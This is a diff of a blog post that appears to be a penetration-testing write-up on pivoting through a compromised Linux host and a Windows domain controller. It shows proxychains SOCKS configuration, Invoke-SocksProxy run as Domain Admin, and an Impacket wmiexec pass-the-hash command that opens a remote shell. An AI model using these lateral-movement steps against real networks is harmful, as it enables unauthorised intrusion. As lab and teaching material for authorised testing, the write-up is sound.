@@ -1,8 +1,8 @@
 ---
 layout: post
 title:  "Pivoting In A Linux + Windows Env"
-date:   2019-10-18 10:03:00 +0100
-categories: jekyll update
+date:   2019-10-18 4:58:00 +0100
+categories: PT pivoting
 ---
 
 Scenario: I had rooted a linux box and used it to compromise other machines including a DC. And now I wanted to use that DC to go deeper into the network.
@@ -34,11 +34,11 @@ I already had the private key for the root account, so I connected and setup dyn
 
 modify /etc/proxychains.conf to include the linux box:
 
-{% highlight bash %}
+``` bash
 [ProxyList]
 ### For Lab:
 socks4 127.0.0.1 9000 
-{% endhighlight %}
+```
 
 And thats it, now prefix any command you need to be proxied through the linux box with `proxychains`.
 
@@ -50,7 +50,7 @@ I used the following powershell script to setup a socks proxy on the windows mac
 Drop the script `Invoke-SocksProxy.psm1` from the repo on the windows machine. And run it.
 In this scenario I ran the socks proxy on port 9000, note that I am a Domain Admin:
 
-{% highlight bash %}
+``` powershell
 PS C:\users\humoud\Documents> Import-Module .\Invoke-SocksProxy.psm1
 PS C:\users\humoud\Documents> Invoke-SocksProxy -bindPort 9000
 Listening on port 9000...
@@ -62,26 +62,26 @@ New Connection from  172.16.1.221:36332
 Threads Left: 198
 New Connection from  172.16.1.221:36334
 Threads Left: 197
-{% highlight bash %}
+```
 
 ### On Our Attacking Machine (Kali):
 Now, we need to configure proxychains on our attacking machine.
 
 modify /etc/proxychains.conf:
 
-{% highlight bash %}
+``` bash
 [ProxyList]
 ### For Lab:
 socks4 127.0.0.1 9000   # For the Linux Box, already there
 socks4 172.16.1.2 9000  # Windows Box (DC1) <added this>
-{% endhighlight %}
+```
 
 ### Testing:
 Time to test the setup, run a command prefixed with `proxychains`.
 Here I ran wmiexec from Impacket, attempted to pass-the-hash and it succeeded:
 
-{% highlight bash %}
-# proxychains wmiexec.py -hashes :some_hash_here_:) administrator@172.16.2.3
+```bash
+> proxychains wmiexec.py -hashes :some_hash_here_:) administrator@172.16.2.3
 ProxyChains-3.1 (http://proxychains.sf.net)
 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
@@ -92,5 +92,5 @@ Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 [!] Launching semi-interactive shell - Careful what you execute
 [!] Press help for extra shell commands
 C:\>
-{% endhighlight %}
+```
 
